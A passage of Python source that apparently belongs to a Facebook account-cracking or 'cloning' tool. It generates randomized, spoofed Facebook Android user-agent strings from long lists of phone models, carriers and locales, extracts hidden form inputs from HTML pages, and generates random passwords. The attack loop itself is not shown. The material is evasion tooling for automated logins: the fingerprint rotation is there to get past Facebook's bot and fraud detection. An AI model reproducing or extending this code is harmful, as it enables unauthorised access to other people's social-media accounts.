    blu_model = random.choice(['BLU R1 HD','F92 E 5G','Advance A7','Advance A5','B1550VL','Advance A5 LTE','C5L PLUS','BLU ENERGY DIAMOND','BLU STUDIO ONE','BLU STUDIO X MINI ','Grand M3'])
    android_version = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
    fbdm_code = random.choice(['{density=2.0,width=720,height=1440}'])
    sim_name = random.choice(['MTS','AREEBA','Boost Mobile','TELCEL','DIALOG','KOREK','Movistar','Telia','Orange','Claro AR','Djezzy','MTML','MetroPCS','TIGO','T-Mobile','VodafoneAL','ENTEL','Oi','Mobitel LK','I WIND','NL KPN','S COMVIQ','vodafone P','MEO','NOS','altice MEO','GLOBE','TM','BASE | Lycamobile','EE','O2 - UK','Vodafone RO','Virgin','Sprint','AT&amp-T','HT HR','null'])
    doogee_model = random.choice(['Doogee X9 Pro','Doogee Y6 Piano Black','Doogee BL12000','Doogee Mix 2','Doogee X95 Pro','Doogee N30','Doogee S88 Plus','Doogee S96 Pro','Doogee N40 Pro','Doogee X97 Pro'])
    uaa1 = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+facebook_version+';FBBV/'+fb_ver_code+';FBRV/'+fbrv_ver_code+';FBPN/com.facebook.katana;FBLC/'+fblc_code+';FBMF/Blu;FBBD/Blu;FBDV/'+blu_model+';FBSV/'+android_version+';FBCA/armeabi-v8a:armeabi;FBDM/'+fbdm_code+';FB_FW/1;]'
    uaa2 = f'[FBAN/FB4A;FBAV/'+str(random.randint(10,100))+'.0.0.'+str(random.randint(1,8))+'.'+str(random.randint(40,150))+';FBBV/'+str(random.randint(4100000,4999999))+';[FBAN/FB4A;FBAV/'+facebook_version+';FBBV/'+fb_ver_code+';FBDM/'+fbdm_code+';FBLC/'+fblc_code+';FBRV/'+fbrv_ver_code+';FBCR/'+sim_name+';FBMF/DOOGEE;FBBD/DOOGEE;FBPN/com.facebook.katana;FBDV/'+doogee_model+';FBSV/'+android_version+';FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    return random.choice([uaa1,uaa2])

def ____U_A_2____():
    facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
    fb_ver_code = str(random.randint(10000000, 66666666))
    fbrv_ver_code = str(random.randint(000000000,999999999))
    fblc_code = random.choice(['en_GB','en_US','es_LA','fr_FR','ar_AR','sv_SE','pt_BR','it_IT','nl_NL','ru_RU','ro_RO','ko_KR','hr_HR','en_Qaau_US','cs_CZ','de_DE','mk_MK','zh_HK','he_IL','uk_UA','lv_LV','el_GR','zh_TW','nb_NO','en_US AT&amp;amp-T'])
    realme_model = random.choice(["RMX1945","RMX1911","RMX2193","RMX1945","RMX1931","RMX2170","RMX3201","RMX2180","RMX2021","RMX2020","RMX2155","RMX1921","RMX2156","RMX3363","RMX3081","RMX2001","RMX3263","RMX2155","RMX2001","RMX3195","RMX1945","RMX1993"])
    android_version = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
    fbdm_code = random.choice(['{density=2.0,width=720,height=1440}'])
    sim_name = random.choice(['MTS','AREEBA','Boost Mobile','TELCEL','DIALOG','KOREK','Movistar','Telia','Orange','Claro AR','Djezzy','MTML','MetroPCS','TIGO','T-Mobile','VodafoneAL','ENTEL','Oi','Mobitel LK','I WIND','NL KPN','S COMVIQ','vodafone P','MEO','NOS','altice MEO','GLOBE','TM','BASE | Lycamobile','EE','O2 - UK','Vodafone RO','Virgin','Sprint','AT&amp-T','HT HR','null'])
    oppo_model = random.choice(["PADM00","CPH1837","PADT00","CPH1803","CPH1853","CPH1805","CPH1931","CPH1959","CPH1933","CPH1935","CPH1943","CPH1909","CPH1901","PDBM00","CPH1941","CPH2179","CPH2083","CPH2185","CPH2185","CPH2477","CPH2591","CHP2219","CPH1923","CPH2213","CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371","CPH2293","CPH2353","CPH2343","CPH2359","CPH2357","CPH2457","CPH1983","CPH1979"])
    uaa1 = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+facebook_version+';FBBV/'+fb_ver_code+';FBRV/'+fbrv_ver_code+';FBPN/com.facebook.katana;FBLC/'+fblc_code+';FBMF/Realme;FBBD/Realme;FBDV/'+realme_model+';FBSV/'+android_version+';FBCA/armeabi-v8a:armeabi;FBDM/'+fbdm_code+';FB_FW/1;]'
    uaa2 = f'[FBAN/FB4A;FBAV/'+str(random.randint(10,100))+'.0.0.'+str(random.randint(1,8))+'.'+str(random.randint(40,150))+';FBBV/'+str(random.randint(4100000,4999999))+';[FBAN/FB4A;FBAV/'+facebook_version+';FBBV/'+fb_ver_code+';FBDM/'+fbdm_code+';FBLC/'+fblc_code+';FBRV/'+fbrv_ver_code+';FBCR/'+sim_name+';FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/'+oppo_model+';FBSV/'+android_version+';FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    return random.choice([uaa1,uaa2])

def sexy():   
    oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
    redmi = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
    realme =  ["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020","RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]
    infinix = ["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"]
    samsung = ['SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H']  
    budi = ['SM-M236B','SM-A037G','SM-J701MT','SM-A115U','SM-G610M','SM-J530F','SM-A307FN','SM-A405FN','SM-S111DL','SM-A022F','SM-G900P','SM-G986U','SM-G981U','SM-G975U','SM-G981U','SM-G965F','SM-G970U1','SM-G965U','SM-G930T','SM-G930VL','SM-G950U','SM-G981U','SM-N975U','SM-G935U','SM-N960U','SM-G986U','SM-G930R4','SM-N960W','Xiaomi 10 Pro','2201123G','22071212AG','22081212UG','2112123AG','2211133C','Mi 9T Pro','CPH1861','RMX3630','RMX3686','RMX1805','RMX1801','RMX2020','RMX1811','RMX3063','RMX3063','RMX3501','OPPO 1105','oppo 15','oppo6779','oppo6833','OPPO7273','Oppo A1','PCHM10','CPH2071','CPH2185','CPH2179','A37f','SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V']  
    akagami1 = "[FBAN/FB4A;FBAV/311.0.0.44.117;FBBV/280307931;FBDM/{density=2.0,width=720,height=1369};FBLC/pt_BR;FBRV/281357705;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/"+str(random.choice(samsung))+";FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    akagami2 = "[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444780;FBDM/{density=3.0,width=1080,height=2076};FBLC/de_DE;FBRV/278218861;FBCR/smartmobil.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/"+str(random.choice(budi))+";FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
    akagami3 = "[FBAN/FB4A;FBAV/317.0.0.51.119;FBBV/288708667;FBDM/{density=3.0,width=1080,height=2043};FBLC/cs_CZ;FBRV/290555739;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/"+str(random.choice(redmi))+";FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    akagami4 = "[FBAN/FB4A;FBAV/301.0.0.37.477;FBBV/267342877;FBDM/{density=2.0,width=720,height=1424};FBLC/pl_PL;FBRV/268803887;FBCR/T-Mobile.pl;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/"+str(random.choice(oppo))+";FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    akagami5 = "[FBAN/FB4A;FBAV/370.0.0.23.112;FBBV/374931191;FBDM/{density=3.0,width=1080,height=2153};FBLC/en_US;FBRV/0;FBCR/LV TELE2;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/"+str(random.choice(infinix))+";FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    user = random.choice([akagami1,akagami2,akagami3,akagami4,akagami5])
    trt = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + user
    return trt  

def generate_advanced_user_agent():
    facebook_version = f"{random.randint(100, 450)}.0.0.{random.randint(1, 40)}.{random.randint(10, 150)}"
    fbbv = str(random.randint(10000000, 66666666))
    fbrv = str(random.randint(0, 999999999))
    density = random.choice(['2.0', '2.5', '3.0'])
    width = random.choice(["720", "1080", "1280", "1440", "1920", "2160"])
    height = random.choice(["720", "1080", "1280", "1440", "1920", "2560"])
    ver = random.choice(["10", "13", "7.0.0", "7.1.1", "9", "12", "11", "9.0", "8.0.0", "7.1.2", "7.0", "4.4.2", "5.1.1", "6.0.1", "9.0.1"]) 
    manufacturers = ['Samsung', 'Motorola', 'Huawei', 'Xiaomi', 'Asus', 'LG', 'Google', 'Sony', 'OnePlus']
    manufacturer = random.choice(manufacturers)
    models = {
        'Samsung': ['SM-G920F', 'SM-J701F', 'SM-T561', 'SM-G930F', 'SM-G950F', 'SM-G970U', 'SM-N960U'],
        'Motorola': ['Moto G', 'Moto X', 'Moto E', 'Moto G14', 'Moto G Stylus'],
        'Huawei': ['MatePad Pro 11', 'nova 11 SE', 'Mate 60 Pro+', 'Huawei Mate 20 Pro', 'Huawei P30 Lite'],
        'Xiaomi': ['Mi 10', 'Redmi Note 9', 'Mi A3', 'Mi 11 Ultra'],
        'Asus': ['ZenFone 7', 'ROG Phone 5', 'ZenPad Z8'],
        'LG': ['V60 ThinQ', 'G8X ThinQ', 'K40', 'Stylo 6'],
        'Google': ['Pixel 6', 'Pixel 5', 'Pixel 4a'],
        'Sony': ['Xperia 1', 'Xperia 10', 'Xperia L4'],
        'OnePlus': ['OnePlus 9', 'OnePlus 8T', 'OnePlus Nord']
    }
    model = random.choice(models[manufacturer])
    network_type = random.choice(['WiFi', 'LTE', '3G', '5G', 'HSPA+', '4G'])
    language_code = random.choice(['en_US', 'en_GB', 'es_ES', 'fr_FR', 'de_DE', 'it_IT', 'pt_BR', 'ru_RU', 'zh_CN'])
    hardware = random.choice(['arm64-v8a', 'armeabi-v7a', 'x86_64'])
    android_build_fingerprint = (
        f"{manufacturer}/{model}/{model}:"
        f"{ver}/{random.choice(['QKQ1', 'RKQ1', 'TP1A', 'RP1A'])}/{random.randint(100000, 999999)}:user/release-keys"
    )
    ua = (
        f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM/{{density={density},width={width},height={height}}};"
        f"FBLC/{language_code};FBRV/{fbrv};FBCR/{network_type};FBMF/{manufacturer};FBBD/{manufacturer};"
        f"FBPN/com.facebook.katana;FBDV/{model};FBSV/{ver};FBOP/1;FBCA/{hardware};FBDK/{android_build_fingerprint}]"
    )
    return ua
from bs4 import BeautifulSoup

# ▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ EXTRACTOR ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def extractor(data):
    try:
        soup = BeautifulSoup(data, "html.parser")
        extracted_data = {}
        for inputs in soup.find_all("input"):
            name = inputs.get("name")
            value = inputs.get("value")
            if name:
                extracted_data[name] = value
        return extracted_data
    except Exception as e:
        return {"error": str(e)}

# ▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ RANDOM PASSWORD ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def gen_password(length: int = 12) -> str:
    import string as _s
    import secrets  # <-- CRITICAL FIX: Is line ko add kiya taake crash na ho
    
    symbols = "!@#$%^&*"
    alphabet = _s.ascii_lowercase + _s.ascii_uppercase + _s.digits + symbols
    
    mandatory = [
        secrets.choice(_s.ascii_lowercase),
        secrets.choice(_s.ascii_uppercase),
        secrets.choice(_s.digits),
        secrets.choice(symbols),
    ]
    
    remaining = [secrets.choice(alphabet) for _ in range(max(0, length - len(mandatory)))]
    pwd = mandatory + remaining
    secrets.SystemRandom().shuffle(pwd)
    return "".join(pwd)

#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ETC MODULES]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 